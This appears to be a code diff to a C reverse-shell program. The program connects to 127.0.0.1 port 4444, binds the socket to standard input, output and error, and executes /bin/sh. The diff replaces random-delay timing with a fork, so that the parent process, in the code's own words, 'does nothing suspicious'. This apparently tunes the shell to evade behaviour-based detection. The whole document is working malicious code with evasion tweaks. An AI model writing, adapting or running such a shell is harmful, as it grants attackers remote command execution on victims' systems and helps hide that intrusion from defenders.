@@ -3,10 +3,8 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <stdlib.h>
-#include <time.h>
 
 int main() {
-    srand(time(NULL));
     int sock;
     struct sockaddr_in server;
 
@@ -15,18 +13,34 @@ int main() {
     server.sin_port = htons(4444);
     inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);
 
-    usleep(rand() % 1000000); // random microsecond delay
-    connect(sock, (struct sockaddr*)&server, sizeof(server));
-    usleep(rand() % 1000000);
-    dup2(sock, 0);
-    usleep(rand() % 1000000);
-    dup2(sock, 1);
-    usleep(rand() % 1000000);
-    dup2(sock, 2);
-    usleep(rand() % 1000000);
+    // Parent does connect
+    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
+        perror("connect failed");
+        return 1;
+    }
 
-    char *args[] = {"/bin/sh", NULL};
-    execve("/bin/sh", args, NULL);
+    pid_t pid = fork();
+
+    if (pid < 0) {
+        perror("fork failed");
+        return 1;
+    }
+
+    if (pid == 0) {
+        // CHILD: does dup2 + execve
+        dup2(sock, 0);
+        dup2(sock, 1);
+        dup2(sock, 2);
+
+        char *args[] = {"/bin/sh", NULL};
+        execve("/bin/sh", args, NULL);
+
+        perror("execve failed");
+        exit(1);
+    } else {
+        // PARENT: does nothing suspicious after connect
+        sleep(2);
+    }
 
     return 0;
 }
